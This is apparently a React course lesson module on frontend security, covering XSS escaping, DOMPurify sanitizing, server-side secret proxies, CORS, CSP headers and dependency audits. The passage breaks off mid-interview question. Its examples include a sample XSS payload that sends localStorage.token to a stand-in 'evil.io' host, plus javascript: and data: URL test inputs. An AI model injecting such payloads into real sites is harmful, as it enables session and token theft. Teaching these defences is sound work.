export default {
  id: 'day-44-security-in-react-apps',
  title: 'Security in React Apps: XSS, dangerouslySetInnerHTML, DOMPurify, Secrets in Env Vars, CORS, CSP and Dependency Audits',
  module: 'Module 9: Authentication & Security',
  day: 44,
  level: 'Advanced',
  duration: '2.5 hours',
  summary:
    'Frontend security is about not letting attackers run code in your users\' browsers and not leaking secrets. You will learn how React protects you from XSS by default, where that protection ends (dangerouslySetInnerHTML, javascript: URLs, refs), how to sanitize HTML with DOMPurify, why .env secrets in a Vite app are not secret, what CORS really is, how a Content Security Policy blocks injected scripts, and how teams audit npm dependencies.',
  objectives: [
    'Explain Cross-Site Scripting (XSS) and how React\'s automatic escaping prevents most of it',
    'Use dangerouslySetInnerHTML safely with DOMPurify and block javascript: URLs in links',
    'Decide what can and cannot go in VITE_ environment variables and use a backend proxy for secret keys',
    'Explain CORS errors correctly and fix them on the server, not in React',
    'Add a Content Security Policy and other security headers, and run npm audit / Dependabot in a team workflow',
  ],
  theory: [
    {
      heading: 'XSS: the number one frontend attack',
      content:
        '**Cross-Site Scripting (XSS)** happens when an attacker manages to get **their JavaScript running on your page**, inside your user\'s browser. Once it runs, it can read tokens from localStorage, make API calls as the user, change the page to show a fake login form, or send data to the attacker\'s server.\n\nTypical entry points: product reviews, chat messages, profile bios, URL query params, rich-text blog posts, and data from a third-party API.\n\nThree types:\n- **Stored XSS**: the payload is saved in the database (a review containing `<img src=x onerror=...>`), and every visitor runs it\n- **Reflected XSS**: the payload comes from the URL (`/search?q=<script>...`) and is echoed into the page\n- **DOM-based XSS**: your own JS takes untrusted data and writes it with `innerHTML`, `eval`, `document.write` or `location = ...`\n\nAnalogy: your website is a notice board in a housing society. Anyone can pin a note. XSS is when someone pins a note that, when read, makes the reader hand over their house keys. Escaping means showing every note **as plain text behind glass**: you can read it, but it cannot act.',
    },
    {
      heading: 'How React protects you, and where it does not',
      content:
        'When you write `<p>{comment}</p>`, React inserts the value as a **text node**, so `<script>` is shown as the characters `<script>`, never executed. This **automatic escaping** blocks most XSS for free.\n\nReact does NOT protect you in these cases:\n1. `dangerouslySetInnerHTML={{ __html: html }}`: you are explicitly saying "trust this HTML"\n2. **URLs in attributes**: `<a href={user.website}>` where website is `javascript:alert(1)`. React 16.9+ warns, and React 19 blocks `javascript:` URLs in `href`/`src`, but older apps and other schemes (`data:`) still need checks\n3. **Direct DOM access**: `ref.current.innerHTML = ...`, `document.write`, `eval`, `new Function(userInput)`\n4. **Spreading user-controlled props**: `<div {...userObject} />` could inject `dangerouslySetInnerHTML` or event handlers\n5. **Server-side rendering** of JSON into a `<script>` tag without escaping `</script>`\n6. Third-party libraries that internally use innerHTML (old markdown renderers, chart tooltips)',
      syntax:
        "// SAFE: escaped automatically\n<p>{review.text}</p>\n\n// DANGEROUS: raw HTML from a user\n<div dangerouslySetInnerHTML={{ __html: review.text }} />\n\n// DANGEROUS: unchecked URL\n<a href={profile.website}>Website</a>\n\n// DANGEROUS: bypasses React\nref.current.innerHTML = review.text;",
      tip: 'The ugly name dangerouslySetInnerHTML is deliberate. In code reviews, every use of it should come with a comment explaining where the HTML comes from and how it is sanitized.',
    },
    {
      heading: 'Sanitizing HTML with DOMPurify',
      content:
        'Sometimes you really need to render HTML: a blog post from a CMS, a product description with bold text, an email preview. The answer is **sanitization**: parse the HTML and keep only an **allowlist** of safe tags and attributes, removing `<script>`, `on*` event handlers, `javascript:` links, `<iframe>`, `<style>` and so on.\n\n**DOMPurify** (by Cure53) is the industry-standard library: `npm install dompurify`. It is fast, maintained by security experts, and handles tricky browser parsing edge cases you would never think of. **Never write your own regex-based sanitizer for production**: attackers know hundreds of bypasses.\n\nBest practice: wrap it in **one reusable component** (`<SafeHtml html={...} />`) so the whole codebase has a single, reviewed place where raw HTML enters the DOM. For Markdown, use `react-markdown`, which renders to React elements (no innerHTML) and does not render raw HTML by default.',
      syntax:
        "import DOMPurify from 'dompurify';\n\nexport function SafeHtml({ html, className }) {\n  const clean = DOMPurify.sanitize(html, {\n    ALLOWED_TAGS: ['b', 'strong', 'i', 'em', 'p', 'br', 'ul', 'ol', 'li', 'a', 'h3'],\n    ALLOWED_ATTR: ['href', 'target', 'rel'],\n  });\n  return <div className={className} dangerouslySetInnerHTML={{ __html: clean }} />;\n}",
      tip: 'Sanitize on the client right before rendering, even if the backend also sanitizes. Defence in depth: the data might reach your app through another path (an old record, an admin import, a third-party API).',
    },
    {
      heading: 'Secrets and environment variables',
      content:
        'In Vite, only variables prefixed with `VITE_` are exposed to your code via `import.meta.env.VITE_X`, and they are **replaced with their literal value at build time**. Open DevTools > Sources on any deployed site and you can search the bundle for them.\n\nRule: **a React app cannot keep a secret.** Everything shipped to the browser is public.\n\n- OK in VITE_ vars: API base URL, Firebase web config, Supabase anon key, Razorpay **key_id**, Google Maps key **restricted by HTTP referrer**, Sentry DSN, feature flags\n- NEVER in VITE_ vars: Razorpay **key_secret**, Stripe **secret key**, OpenAI/Gemini API keys, database passwords, JWT signing secrets, AWS secret keys, SMTP passwords\n\nIf the frontend needs a secret-key API (OpenAI, SMS gateway, payment capture), call **your own backend** (Express route, Vercel/Netlify serverless function, Firebase Cloud Function). The server holds the secret in its own environment, checks the user, rate-limits, then calls the third-party API.\n\nAlso: add `.env*.local` to `.gitignore`, commit a `.env.example` with empty values, and if a secret is ever committed, **rotate it** immediately (deleting the commit is not enough; bots scan GitHub within minutes).',
      syntax:
        "# .env.local  (git-ignored)\nVITE_API_URL=https://api.mystore.in\nVITE_RAZORPAY_KEY_ID=rzp_test_123        # public id: OK\n# RAZORPAY_KEY_SECRET=...  <- belongs on the SERVER only\n\n// api/chat.js  (Vercel serverless function, runs on server)\nexport default async function handler(req, res) {\n  const r = await fetch('https://api.openai.com/v1/responses', {\n    method: 'POST',\n    headers: { Authorization: 'Bearer ' + process.env.OPENAI_API_KEY, 'Content-Type': 'application/json' },\n    body: JSON.stringify({ model: 'gpt-4.1-mini', input: req.body.message }),\n  });\n  res.status(r.status).json(await r.json());\n}",
    },
    {
      heading: 'CORS explained properly',
      content:
        '**Same-Origin Policy**: by default, JS on `https://shop.in` cannot read responses from `https://api.other.com` (different origin = different scheme, host or port). This protects users: a random site cannot read your Gmail with your cookies.\n\n**CORS (Cross-Origin Resource Sharing)** is how a **server opts in** to being read by other origins. The browser sends `Origin: https://shop.in`; the server replies with `Access-Control-Allow-Origin: https://shop.in`. For non-simple requests (JSON body, Authorization header, PUT/DELETE) the browser first sends an **OPTIONS preflight**.\n\nKey facts interviewers check:\n- CORS is enforced by the **browser**, configured on the **server**. You cannot "fix CORS" in React code. Adding `Access-Control-Allow-Origin` to your request headers does nothing.\n- Postman/curl never show CORS errors because they are not browsers.\n- In development use the **Vite proxy** (`server.proxy`) so requests look same-origin.\n- In production configure the API (Express `cors({ origin: [\'https://shop.in\'], credentials: true })`) or put frontend and API behind one domain.\n- `Access-Control-Allow-Origin: *` cannot be used together with cookies (`credentials`).\n- CORS is **not** a security feature for your API: it does not stop curl or attackers\' servers. Your API still needs authentication.',
      syntax:
        "// vite.config.js: dev proxy, browser calls /api/... on the same origin\nexport default defineConfig({\n  server: {\n    proxy: { '/api': { target: 'http://localhost:5000', changeOrigin: true } },\n  },\n});\n\n// server (Express)\nimport cors from 'cors';\napp.use(cors({ origin: ['http://localhost:5173', 'https://shop.in'], credentials: true }));",
    },
    {
      heading: 'CSP, security headers and dependency audits',
      content:
        'A **Content Security Policy (CSP)** is an HTTP header that tells the browser which sources of scripts, styles, images and connections are allowed. Even if an attacker injects `<script src="https://evil.io/x.js">` or an inline `onerror`, the browser **refuses to run it**. It is the safety net behind your escaping.\n\nA good starting CSP for a Vite SPA: `default-src \'self\'; script-src \'self\'; style-src \'self\' \'unsafe-inline\'; img-src \'self\' data: https:; connect-src \'self\' https://api.mystore.in; frame-ancestors \'none\'; object-src \'none\'; base-uri \'self\'`. Start with `Content-Security-Policy-Report-Only` to see violations without breaking the site.\n\nOther headers to set on Vercel/Netlify/Nginx: `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Strict-Transport-Security` (HTTPS only), `Permissions-Policy`, and `frame-ancestors` (anti-clickjacking).\n\n**Dependencies**: a typical React app has 800+ packages in node_modules, and supply-chain attacks are real. Team habits:\n- `npm audit` (and `npm audit fix`) locally and in CI; fail the build on high/critical\n- **Dependabot** or Renovate PRs for updates; review changelogs\n- Commit `package-lock.json` and use `npm ci` in CI for reproducible installs\n- Check package popularity, maintainers and typosquatting (`reacct-dom`) before installing\n- Remove unused packages; fewer packages = smaller attack surface',
      syntax:
        "// vercel.json\n{\n  \"headers\": [{\n    \"source\": \"/(.*)\",\n    \"headers\": [\n      { \"key\": \"Content-Security-Policy\", \"value\": \"default-src 'self'; script-src 'self'; img-src 'self' data: https:; connect-src 'self' https://api.mystore.in; frame-ancestors 'none'; object-src 'none'\" },\n      { \"key\": \"X-Content-Type-Options\", \"value\": \"nosniff\" },\n      { \"key\": \"Referrer-Policy\", \"value\": \"strict-origin-when-cross-origin\" }\n    ]\n  }]\n}\n\n# terminal\nnpm audit --audit-level=high\nnpm outdated",
      tip: 'Token storage recap from Day 41: tokens in localStorage are readable by any XSS. Many companies use a short-lived access token in memory plus a refresh token in an httpOnly, Secure, SameSite cookie. Whatever you choose, preventing XSS is what really protects tokens.',
    },
  ],
  examples: [
    {
      title: 'Escaping vs dangerouslySetInnerHTML: watch XSS happen',
      scenario:
        'A Jaipur handicraft store shows customer reviews. One "customer" submits a review containing an image tag with an onerror handler. Compare three ways of rendering it.',
      steps: [
        'Create ReviewList.jsx with a reviews array, one of them containing an XSS payload',
        'Render the text with {review.text} (React escaping)',
        'Render it with dangerouslySetInnerHTML (unsafe) and watch the console',
        'Render it through a sanitizer (safe HTML)',
        'Run the playground and switch modes',
      ],
      code: `// ReviewList.jsx
const reviews = [
  { id: 1, name: 'Kavya', text: 'Beautiful <b>blue pottery</b> vase, fast delivery!' },
  { id: 2, name: 'Attacker', text: '<img src="x" onerror="fetch(\\'https://evil.io?t=\\'+localStorage.token)">Nice!' },
];

// 1. SAFE: React escapes, tags appear as text
<p>{review.text}</p>

// 2. UNSAFE: onerror runs and steals the token
<p dangerouslySetInnerHTML={{ __html: review.text }} />

// 3. SAFE + formatted: sanitize first (DOMPurify in real projects)
import DOMPurify from 'dompurify';
<p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(review.text) }} />`,
      playground: {
        jsx: `const { useState } = React;

// Learning sanitizer (allowlist). In real projects use DOMPurify.sanitize().
const ALLOWED = ['B', 'STRONG', 'I', 'EM', 'P', 'BR', 'UL', 'LI'];
function sanitize(html) {
  const doc = new DOMParser().parseFromString('<div>' + html + '</div>', 'text/html');
  const root = doc.body.firstChild;
  (function clean(node) {
    Array.from(node.childNodes).forEach(child => {
      if (child.nodeType === 1) {
        if (!ALLOWED.includes(child.tagName)) { child.remove(); return; }
        Array.from(child.attributes).forEach(a => child.removeAttribute(a.name));
        clean(child);
      }
    });
  })(root);
  return root.innerHTML;
}

window.fakeSteal = msg => console.log('XSS EXECUTED! Attacker could now read: ' + msg);
try { localStorage.setItem('token', 'eyJhbGciOi...secret'); } catch (e) {}

const reviews = [
  { id: 1, name: 'Kavya (Jaipur)', text: 'Beautiful <b>blue pottery</b> vase, fast delivery!' },
  { id: 2, name: 'Attacker', text: '<img src="x" onerror="fakeSteal(\\'token=eyJhbGciOi...\\')">Nice product!' },
];

function App() {
  const [mode, setMode] = useState('escaped');
  return (
    <div className="wrap">
      <h2>Customer reviews</h2>
      <div className="modes">
        {['escaped', 'unsafe', 'sanitized'].map(m => (
          <button key={m} className={m === mode ? 'on ' + m : ''} onClick={() => setMode(m)}>{m}</button>
        ))}
      </div>
      {reviews.map(r => (
        <div className="review" key={mode + r.id}>
          <strong>{r.name}</strong>
          {mode === 'escaped' && <p>{r.text}</p>}
          {mode === 'unsafe' && <p dangerouslySetInnerHTML={{ __html: r.text }} />}
          {mode === 'sanitized' && <p dangerouslySetInnerHTML={{ __html: sanitize(r.text) }} />}
        </div>
      ))}
      <p className="note">
        {mode === 'escaped' && 'Safe: React shows the tags as plain text. Nothing runs.'}
        {mode === 'unsafe' && 'DANGER: check the console. The onerror handler ran attacker code.'}
        {mode === 'sanitized' && 'Safe and formatted: <b> kept, <img onerror> removed.'}
      </p>
    </div>
  );
}`,
        css: `body { font-family: system-ui, sans-serif; background: #fdf4ff; margin: 0; padding: 20px; }
.wrap { max-width: 460px; margin: auto; background: #fff; padding: 20px; border-radius: 12px; }
h2 { margin-top: 0; }
.modes { display: flex; gap: 6px; margin-bottom: 12px; }
.modes button { flex: 1; padding: 8px; border: 1px solid #e9d5ff; background: #fff; border-radius: 8px; cursor: pointer; text-transform: capitalize; }
.modes .on.escaped, .modes .on.sanitized { background: #16a34a; color: #fff; }
.modes .on.unsafe { background: #dc2626; color: #fff; }
.review { border-bottom: 1px solid #f3e8ff; padding: 8px 0; }
.review p { margin: 4px 0; word-break: break-all; }
.note { background: #faf5ff; padding: 10px; border-radius: 8px; font-size: 14px; }`,
      },
      result:
        'Escaped mode shows the raw tags as text. Unsafe mode shows "Nice product!" with a broken image and the console prints "XSS EXECUTED! ...". Sanitized mode shows bold "blue pottery" and "Nice product!" with no image and no console message.',
      explanation:
        'React text interpolation creates text nodes, so markup is harmless. dangerouslySetInnerHTML hands the string to the browser parser; the broken image fires onerror, which runs the attacker\'s code (here a harmless fakeSteal, in real life fetch to the attacker with your token). The sanitizer is a simplified plain-JS allowlist that shows the idea of DOMPurify: parse, keep allowed tags, strip every attribute. Use the real DOMPurify in production.',
    },
    {
      title: 'Blocking javascript: URLs in user-provided links',
      scenario:
        'A freelancer marketplace lets users add a "portfolio website" to their profile. An attacker enters javascript:... as the URL. Build a SafeLink component.',
      steps: [
        'Create src/components/SafeLink.jsx',
        'Parse the URL with new URL(value, window.location.origin)',
        'Allow only http:, https: and mailto: protocols',
        'For external links add target="_blank" rel="noopener noreferrer"',
        'Run the playground and try different URLs',
      ],
      code: `// src/components/SafeLink.jsx
const SAFE_PROTOCOLS = ['http:', 'https:', 'mailto:'];

export function isSafeUrl(value) {
  try {
    const url = new URL(value, window.location.origin);
    return SAFE_PROTOCOLS.includes(url.protocol);
  } catch {
    return false;
  }
}

export default function SafeLink({ href, children, ...rest }) {
  if (!isSafeUrl(href)) return <span title="Blocked unsafe link">{children}</span>;
  const external = new URL(href, window.location.origin).origin !== window.location.origin;
  return (
    <a
      href={href}
      {...(external && { target: '_blank', rel: 'noopener noreferrer' })}
      {...rest}
    >
      {children}
    </a>
  );
}`,
      playground: {
        jsx: `const { useState } = React;
const SAFE_PROTOCOLS = ['http:', 'https:', 'mailto:'];

function isSafeUrl(value) {
  try {
    const url = new URL(value, window.location.origin);
    return SAFE_PROTOCOLS.includes(url.protocol);
  } catch (e) {
    return false;
  }
}

function SafeLink({ href, children }) {
  if (!isSafeUrl(href)) return <span className="blocked" title="Blocked unsafe link">{children} (blocked)</span>;
  return <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>;
}

const samples = [
  'https://arjun-designs.in',
  'mailto:arjun@example.com',
  'javascript:alert(document.cookie)',
  '  JaVaScRiPt:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  '/profile/42',
];

function App() {
  const [url, setUrl] = useState(samples[0]);
  return (
    <div className="wrap">
      <h2>Portfolio link checker</h2>
      <input value={url} onChange={e => setUrl(e.target.value)} aria-label="Website URL" />
      <p>Preview: <SafeLink href={url}>Arjun's portfolio</SafeLink></p>
      <table>
        <tbody>
          {samples.map(s => (
            <tr key={s} onClick={() => setUrl(s)}>
              <td><code>{s}</code></td>
              <td className={isSafeUrl(s) ? 'ok' : 'no'}>{isSafeUrl(s) ? 'allowed' : 'blocked'}</td>
            </tr>
          ))}
        </tbody>
      </table>
      <small>Click a row to try it.</small>
    </div>
  );
}`,
        css: `body { font-family: system-ui, sans-serif; background: #f0f9ff; margin: 0; padding: 20px; }
.wrap { max-width: 480px; margin: auto; background: #fff; padding: 20px; border-radius: 12px; }
h2 { margin-top: 0; }
input { width: 100%; box-sizing: border-box; padding: 8px; border: 1px solid #bae6fd; border-radius: 8px; }
table { width: 100%; border-collapse: collapse; margin: 10px 0; }
td { padding: 6px; border-bottom: 1px solid #e0f2fe; font-size: 13px; word-break: break-all; }
tr { cursor: pointer; } tr:hover { background: #f0f9ff; }
.ok { color: #15803d; font-weight: 600; } .no { color: #b91c1c; font-weight: 600; }
.blocked { color: #b91c1c; }
small { color: #64748b; }`,
      },
      result:
        'https and mailto links render as real links. javascript:, mixed-case JaVaScRiPt: with spaces and data: URLs are shown as "blocked". The relative /profile/42 is allowed because it resolves to the same origin over http(s).',
      explanation:
        'Using the URL parser (instead of startsWith checks) normalises case and whitespace, which is exactly how attackers bypass naive checks. An allowlist of protocols is safer than a blocklist. rel="noopener noreferrer" stops the new tab from controlling your page through window.opener (reverse tabnabbing).',
    },
    {
      title: 'Keeping an API secret on the server (proxy pattern)',
      scenario:
        'A Chennai ed-tech app wants an "Ask AI" box. The developer first put VITE_OPENAI_KEY in the frontend. Move the key to a serverless function and call it from React.',
      steps: [
        'Delete VITE_OPENAI_KEY from .env and rotate the leaked key in the provider dashboard',
        'Create api/ask.js (Vercel) that reads process.env.OPENAI_API_KEY',
        'Check the user session and limit input length on the server',
        'In React, POST to /api/ask with fetch; show loading and error states',
        'Run the playground: a fake /api/ask shows the flow without any key in the browser',
      ],
      code: `// WRONG: key ends up in dist/assets/index-*.js
const key = import.meta.env.VITE_OPENAI_KEY;   // anyone can copy it

// api/ask.js  (Vercel Function: Node runtime, server side)
export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  const { question } = req.body || {};
  if (!question || question.length > 500) return res.status(400).json({ error: 'Invalid question' });
  // verify the user's session / JWT here and apply rate limiting
  const r = await fetch('https://api.openai.com/v1/responses', {
    method: 'POST',
    headers: {
      Authorization: \`Bearer \${process.env.OPENAI_API_KEY}\`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ model: 'gpt-4.1-mini', input: question }),
  });
  if (!r.ok) return res.status(502).json({ error: 'AI service failed' });
  const data = await r.json();
  res.json({ answer: data.output_text });
}

// src/features/ask/askService.js  (browser)
export async function ask(question) {
  const res = await fetch('/api/ask', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ question }),
  });
  if (!res.ok) throw new Error((await res.json()).error || 'Request failed');
  return (await res.json()).answer;
}`,
      playground: {
        jsx: `const { useState } = React;

// ---- pretend server (in real life this runs on Vercel/Netlify, NOT in the browser) ----
const server = {
  env: { OPENAI_API_KEY: 'sk-live-hidden-on-server' },
  async post(path, body) {
    await new Promise(r => setTimeout(r, 700));
    if (!body.question || body.question.length > 120) return { status: 400, json: { error: 'Question must be 1-120 characters' } };
    console.log('[server] calling AI provider with key ending in ...' + this.env.OPENAI_API_KEY.slice(-4));
    return { status: 200, json: { answer: 'Short answer to "' + body.question + '": revise closures and useEffect cleanup!' } };
  },
};

// ---- browser code: only knows the URL /api/ask ----
async function ask(question) {
  const res = await server.post('/api/ask', { question });
  if (res.status !== 200) throw new Error(res.json.error);
  return res.json.answer;
}

function App() {
  const [q, setQ] = useState('How do I prepare for a React interview?');
  const [answer, setAnswer] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const bundleVars = { VITE_API_URL: 'https://api.padhai.in', VITE_RAZORPAY_KEY_ID: 'rzp_test_9xYz' };

  async function submit(e) {
    e.preventDefault();
    setLoading(true); setError(''); setAnswer('');
    try { setAnswer(await ask(q)); } catch (err) { setError(err.message); } finally { setLoading(false); }
  }

  return (
    <div className="wrap">
      <h2>Ask AI</h2>
      <form onSubmit={submit}>
        <input value={q} onChange={e => setQ(e.target.value)} />
        <button disabled={loading}>{loading ? 'Thinking...' : 'Ask'}</button>
      </form>
      {error && <p className="err">{error}</p>}
      {answer && <p className="ans">{answer}</p>}
      <h3>What the browser bundle contains (import.meta.env)</h3>
      <pre>{JSON.stringify(bundleVars, null, 2)}</pre>
      <p className="note">No secret key here. The AI key lives only in the server's environment.</p>
    </div>
  );
}`,
        css: `body { font-family: system-ui, sans-serif; background: #f8fafc; margin: 0; padding: 20px; }
.wrap { max-width: 460px; margin: auto; background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,.06); }
h2 { margin-top: 0; } h3 { font-size: 15px; margin-bottom: 4px; }
form { display: flex; gap: 6px; }
input { flex: 1; padding: 8px; border: 1px solid #cbd5e1; border-radius: 8px; }
button { padding: 8px 14px; border: 0; border-radius: 8px; background: #0f766e; color: #fff; cursor: pointer; }
.ans { background: #f0fdfa; padding: 10px; border-radius: 8px; }
.err { color: #b91c1c; }
pre { background: #0f172a; color: #a7f3d0; padding: 10px; border-radius: 8px; font-size: 12px; }
.note { font-size: 13px; color: #475569; }`,
      },
      result:
        'Asking a question shows "Thinking..." then the answer, and the console prints a [server] log with only the last 4 characters of the key. An empty question or a very long one shows the server validation error. The "bundle" panel lists only public values.',
      explanation:
        'Plain-React simulation of the proxy pattern: the browser knows only the endpoint, the server object owns the key, validates input and returns a safe error. In a real deployment the server part is a separate file (api/ask.js) that never gets bundled into the React app, so DevTools can never reveal the key.',
    },
    {
      title: 'Building and testing a Content Security Policy',
      scenario:
        'Before going live, the security checklist of a Hyderabad fintech says "CSP required". Build the header, deploy it in Report-Only mode first, then enforce it.',
      steps: [
        'List every origin the app loads from: API, images CDN, fonts, analytics',
        'Create the CSP string with default-src \'self\' plus only those origins',
        'Add it to vercel.json / netlify _headers as Content-Security-Policy-Report-Only',
        'Open the deployed site, watch DevTools Console for violations, fix or allow them',
        'Switch the header name to Content-Security-Policy to enforce it',
        'Use the playground to build the header string interactively',
      ],
      code: `# public/_headers  (Netlify)
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://cdn.dummyjson.com; connect-src 'self' https://api.paysafe.in; frame-ancestors 'none'; object-src 'none'; base-uri 'self'
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  Permissions-Policy: camera=(), microphone=(), geolocation=(self)

# Quick local check of the built app
npm run build && npx vite preview
curl -I https://your-site.netlify.app | grep -i content-security`,
      playground: {
        jsx: `const { useState } = React;

const base = {
  'default-src': ["'self'"],
  'script-src': ["'self'"],
  'style-src': ["'self'", "'unsafe-inline'"],
  'img-src': ["'self'", 'data:'],
  'connect-src': ["'self'"],
  'frame-ancestors': ["'none'"],
  'object-src': ["'none'"],
  'base-uri': ["'self'"],
};

const extras = [
  { label: 'Google Fonts', add: { 'style-src': ['https://fonts.googleapis.com'], 'font-src': ['https://fonts.gstatic.com'] } },
  { label: 'Product images (dummyjson CDN)', add: { 'img-src': ['https://cdn.dummyjson.com'] } },
  { label: 'Our API', add: { 'connect-src': ['https://api.paysafe.in'] } },
  { label: 'Razorpay Checkout', add: { 'script-src': ['https://checkout.razorpay.com'], 'frame-src': ['https://api.razorpay.com'] } },
];

function build(selected, reportOnly) {
  const policy = JSON.parse(JSON.stringify(base));
  extras.forEach((x, i) => {
    if (!selected[i]) return;
    Object.entries(x.add).forEach(([dir, values]) => { policy[dir] = (policy[dir] || []).concat(values); });
  });
  const value = Object.entries(policy).map(([d, v]) => d + ' ' + v.join(' ')).join('; ');
  return (reportOnly ? 'Content-Security-Policy-Report-Only' : 'Content-Security-Policy') + ': ' + value;
}

function App() {
  const [selected, setSelected] = useState([true, true, true, false]);
  const [reportOnly, setReportOnly] = useState(true);
  const header = build(selected, reportOnly);
  const toggle = i => setSelected(selected.map((v, j) => (j === i ? !v : v)));
  return (
    <div className="wrap">
      <h2>CSP builder</h2>
      {extras.map((x, i) => (
        <label key={x.label}><input type="checkbox" checked={selected[i]} onChange={() => toggle(i)} /> {x.label}</label>
      ))}
      <label><input type="checkbox" checked={reportOnly} onChange={() => setReportOnly(!reportOnly)} /> Report-Only (test first)</label>
      <pre>{header}</pre>
      <button onClick={() => { navigator.clipboard && navigator.clipboard.writeText(header).catch(() => {}); console.log(header); }}>Copy header</button>
    </div>
  );
}`,
        css: `body { font-family: system-ui, sans-serif; background: #fefce8; margin: 0; padding: 20px; }
.wrap { max-width: 520px; margin: auto; background: #fff; padding: 20px; border-radius: 12px; display: grid; gap: 6px; }
h2 { margin: 0 0 6px; }
label { font-size: 14px; }
pre { white-space: pre-wrap; word-break: break-all; background: #1e293b; color: #fde68a; padding: 12px; border-radius: 8px; font-size: 12px; }
button { justify-self: start; padding: 8px 14px; border: 0; border-radius: 8px; background: #ca8a04; color: #fff; cursor: pointer; }`,
      },
      result:
        'The header string updates as you tick sources. Turning off Report-Only changes the header name to Content-Security-Policy. Copy header logs the string to the console (and copies it when the clipboard is allowed).',
      explanation:
        'A CSP is just a list of directives, each with allowed sources. Starting from a strict base (\'self\' only, no objects, no framing) and adding exactly the origins you need is the allowlist mindset. Report-Only lets you discover what would break before enforcing. Note that Razorpay needs both script-src (checkout.js) and frame-src (the payment iframe), a common real-world gotcha.',
    },
    {
      title: 'Dependency audit workflow in a team',
      scenario:
        'npm install prints "7 vulnerabilities (2 high)". Your team lead asks you to fix them properly and make sure new ones are caught automatically.',
      steps: [
        'Run npm audit to see the advisory, the vulnerable package and the dependency path',
        'Run npm audit fix (non-breaking upgrades) and re-run tests',
        'For the rest, check if the vulnerable code is used in production (devDependency vs dependency) and upgrade the parent package or use overrides',
        'Add .github/dependabot.yml for weekly update PRs',
        'Add an npm audit step to the CI workflow that fails on high/critical',
      ],
      code: `# 1. inspect
npm audit
npm audit --omit=dev          # only what ships to production
npm ls nth-check              # who depends on the vulnerable package?

# 2. fix safely
npm audit fix                 # semver-compatible upgrades only
# NOT blindly: npm audit fix --force  (may install breaking majors)

# 3. force a patched transitive version (package.json)
{
  "overrides": {
    "nth-check": "^2.1.1"
  }
}

# 4. .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5

# 5. CI step (GitHub Actions)
- run: npm ci
- run: npm audit --audit-level=high --omit=dev`,
      result:
        'Production dependencies show 0 high/critical vulnerabilities, Dependabot opens weekly PRs, and CI fails any PR that introduces a high-severity advisory.',
      explanation:
        'npm audit compares your lockfile against the GitHub Advisory Database. Many reported issues live in dev-only tooling and never reach users, so --omit=dev focuses on what matters. overrides pins a safe version of a deep dependency when the parent has not updated yet. Automating with Dependabot and CI turns security from a one-time cleanup into a habit.',
    },
  ],
  interview: [
    {
      q: 'What is XSS and how does React prevent it by default?',
      a: 'Cross-Site Scripting is injecting attacker-controlled script into a page so it runs in other users\' browsers. React escapes all values rendered with {} in JSX: they become text nodes, so "<script>" is displayed, not executed. Protection ends where you bypass React: dangerouslySetInnerHTML, direct innerHTML via refs, eval, unsafe URLs in href/src, and spreading untrusted props.',
      level: 'Easy',
    },
    {
      q: 'When is it acceptable to use dangerouslySetInnerHTML?',
      a: 'Only when you must render HTML (CMS content, rich text) and the HTML is sanitized with a trusted library like DOMPurify using an allowlist, ideally inside one reusable SafeHtml component. Static HTML you wrote yourself is also fine. Never pass raw user input or API data directly.',
      level: 'Medium',
    },
    {
      q: 'Why should you not write your own regex-based HTML sanitizer?',
      a: 'HTML parsing is complex and browsers are lenient: attackers use mixed case, encoded characters, broken tags, SVG/MathML namespaces, mutation XSS and many attributes (onerror, onfocus, formaction, srcdoc). A regex cannot model the parser. DOMPurify uses the browser\'s own DOM parser and is maintained against known bypasses.',
      level: 'Medium',
    },
    {
      q: 'Is a value in import.meta.env.VITE_SECRET safe from users?',
      a: 'No. Vite replaces VITE_ variables with their literal values at build time, so they are inside the JS bundle that every visitor downloads. Only public configuration belongs there. Secret keys must live on a server (backend, serverless function) that the frontend calls.',
      level: 'Easy',
    },
    {
      q: 'You get "blocked by CORS policy" in the browser but the API works in Postman. Explain and fix.',
      a: 'CORS is enforced by browsers only. The API server did not return Access-Control-Allow-Origin for your origin (or failed the OPTIONS preflight). Fix it on the server by allowing the frontend origin (and credentials if using cookies), or in development use the Vite dev-server proxy so requests are same-origin. Adding headers in the React request cannot fix it.',
      level: 'Medium',
    },
    {
      q: 'What is a preflight request?',
      a: 'An automatic OPTIONS request the browser sends before a "non-simple" cross-origin request (methods like PUT/DELETE, custom headers like Authorization, or Content-Type: application/json). The server must answer with Access-Control-Allow-Methods/Headers/Origin; only then does the browser send the real request.',
      level: 'Medium',
    },
    {
      q: 'What does a Content Security Policy do and how does it help against XSS?',
      a: 'CSP is a response header listing allowed sources for scripts, styles, images, connections, frames, etc. If injected markup tries to load a script from another domain or run inline code (when unsafe-inline is not allowed), the browser blocks it. It is defence in depth: it limits damage even if an XSS bug slips through. Deploy in Report-Only mode first.',
      level: 'Medium',
    },
    {
      q: 'localStorage vs httpOnly cookie for JWTs: which is more secure?',
      a: 'localStorage is readable by any script, so an XSS can steal the token. An httpOnly cookie cannot be read by JS, which protects the token value, but cookies are sent automatically, so you need CSRF protection (SameSite=Lax/Strict, CSRF tokens). A common pattern is a short-lived access token in memory plus a refresh token in an httpOnly Secure SameSite cookie. Either way, XSS can still make requests as the user, so preventing XSS is essential.',
      level: 'Hard',
    },
    {
      q: 'What is rel="noopener noreferrer" and why add it to target="_blank" links?',
      a: 'Without noopener, the opened page gets window.opener and can redirect your original tab to a phishing page (reverse tabnabbing). noopener sets opener to null; noreferrer also hides the Referer header. Modern browsers imply noopener for target=_blank, but adding it explicitly is still the standard practice.',
      level: 'Easy',
    },
    {
      q: 'How do you handle vulnerabilities reported by npm audit?',
